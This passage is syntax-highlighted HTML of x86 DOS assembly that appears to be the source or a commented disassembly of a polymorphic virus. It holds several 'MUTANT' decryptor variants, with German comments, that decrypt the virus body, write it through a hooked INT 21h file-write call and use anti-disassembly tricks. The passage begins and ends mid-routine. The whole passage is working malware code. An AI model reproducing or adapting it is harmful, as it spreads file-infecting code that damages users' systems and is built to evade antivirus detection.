                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03DA1</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc2">0433h</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">2000h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">; [2433]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03D92</span><span class="sc0">                  </span><span class="sc1">; AUSGANG !</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">CALL_ENTRY</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">mut_1</span><span class="sc0">
                </span><span class="sc1">;-----------------</span><span class="sc0">
</span><span class="sc5">J03DB9</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">                   </span><span class="sc1">; AH = 40h =&gt; Schreiben !!!!!!</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc2">2466h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; CALL Int 21h !</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03D93</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">89H</span><span class="sc0">

</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( MUTANT #17 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">MUT_17</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">J03DCC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03DCC</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03E04</span><span class="sc0">                  </span><span class="sc1">; = JMP 3E04</span><span class="sc0">
        </span><span class="sc1">;--------( einsprung ) ------</span><span class="sc0">
</span><span class="sc5">J03DDF</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">STD</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; AX =</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03E11</span><span class="sc0">                  </span><span class="sc1">; AX =</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">ZweiByte</span><span class="sc0">             </span><span class="sc1">; CX =</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">1Eh</span><span class="sc0">                 </span><span class="sc1">; BX =</span><span class="sc0">

</span><span class="sc5">J03DED</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; (!!!!!)</span><span class="sc0">
                </span><span class="sc6">CMC</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03DED</span><span class="sc0">
                                        </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D2433</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03E13</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">CMC</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">CALL_ENTRY</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc4">,</span><span class="sc5">mut_17</span><span class="sc0">

</span><span class="sc5">J03E04</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; AH = 40h, SCHREIBEN</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; CALL INT 21h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03DDF</span><span class="sc0">
</span><span class="sc5">J03E11</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">J03E13</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( MUTANT # 16)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">MUT_16</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; CX = 2</span><span class="sc0">
</span><span class="sc5">J03E1A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03E1A</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03E4F</span><span class="sc0">
        </span><span class="sc1">;--------( einsprung ) ------</span><span class="sc0">
</span><span class="sc5">J03E2B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03E5C</span><span class="sc0">                  </span><span class="sc1">; AX =</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; AX =</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">1Dh</span><span class="sc0">                 </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">ZweiByte</span><span class="sc0">             </span><span class="sc1">; CX =</span><span class="sc0">

</span><span class="sc5">J03E38</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03E38</span><span class="sc0">
                                        </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D2433</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03E5E</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">CALL_ENTRY</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc5">mut_16</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J03E4F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; AH = 40h</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@INT21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Schreiben ? Int 21h ?</span><span class="sc0">
</span><span class="sc5">J03E56</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03E2B</span><span class="sc0">
</span><span class="sc5">J03E5C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">J03E5E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0ebh</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================================( MUTANT # 18 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">mut_18</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">J03E60</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">NOT</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03E60</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc5">CALL_INT21</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc5">mut_18</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03E78</span><span class="sc0">

</span><span class="sc5">J03E71</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03E7B</span><span class="sc0">
        </span><span class="sc1">;--------( einsprung  ist $-1 )-------</span><span class="sc0">
        </span><span class="sc1">; ADD BH,DL</span><span class="sc0">
        </span><span class="sc1">; JMP J03E71</span><span class="sc0">
        </span><span class="sc1">;-------------------------------------</span><span class="sc0">

</span><span class="sc5">J03E78</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XLAT</span><span class="sc0">                            </span><span class="sc1">; MOV AL,[BX+AL]</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03E71</span><span class="sc0">

</span><span class="sc5">J03E7B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; DX =</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">239Dh</span><span class="sc0">                </span><span class="sc1">; DX =</span><span class="sc0">
                </span><span class="sc6">STC</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">CODE_LEN</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">0F0FH</span><span class="sc0">   </span><span class="sc1">; CX =</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0F0Fh</span><span class="sc0">                </span><span class="sc1">; CX =</span><span class="sc0">
</span><span class="sc5">J03E8B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">NOT</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">STD</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03E8B</span><span class="sc0">
                                        </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">8Dh</span><span class="sc0">          </span><span class="sc1">; CX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">XLAT</span><span class="sc0">                    </span><span class="sc1">; MOV AL,[BX+AL] ; AL = []</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03E56</span><span class="sc0">  </span><span class="sc1">;-&lt;&lt;&gt;&gt;--&lt; ZEIGT AUF L0L0L0 &gt;-----&lt;&lt;&gt;&gt;--</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SS</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; AX &lt;- 0</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">; DS &lt;- ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; CX &lt;- DS</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc5">mut_18</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( MUTANT #30 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Mut_30</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">J03EAC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">NOT</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03EAC</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc5">CALL_INT21</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc4">,</span><span class="sc5">mut_30</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03EC3</span><span class="sc0">

</span><span class="sc5">J03EBC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03EC5</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
</span><span class="sc5">J03EC3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03EBC</span><span class="sc0">

</span><span class="sc5">J03EC5</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; AX =</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">239Ch</span><span class="sc0">                </span><span class="sc1">; AX =</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; BX =</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">CODE_LEN</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">0FDABH</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0FDABh</span><span class="sc0">               </span><span class="sc1">; CX = 2385</span><span class="sc0">

</span><span class="sc5">J03ED1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">NOT</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03ED1</span><span class="sc0">
                                        </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">8Eh</span><span class="sc0">
                </span><span class="sc6">XLAT</span><span class="sc0">                            </span><span class="sc1">; MOV AL,[BX+AL]; AL = []</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03EF2</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; BX &lt;- ES</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; DS &lt;- ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; BX &lt;- DS</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; AX &lt;- 0</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc4">,</span><span class="sc5">mut_30</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
                </span><span class="sc9">Dw</span><span class="sc0">      </span><span class="sc2">8903h</span><span class="sc4">,</span><span class="sc2">0A5EFh</span><span class="sc4">,</span><span class="sc2">0CC14H</span><span class="sc0">
</span><span class="sc5">J03EF2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RET</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0c111h</span><span class="sc4">,</span><span class="sc2">0b4deh</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================================( MUTANT # 8)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">mut_8</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">                      </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
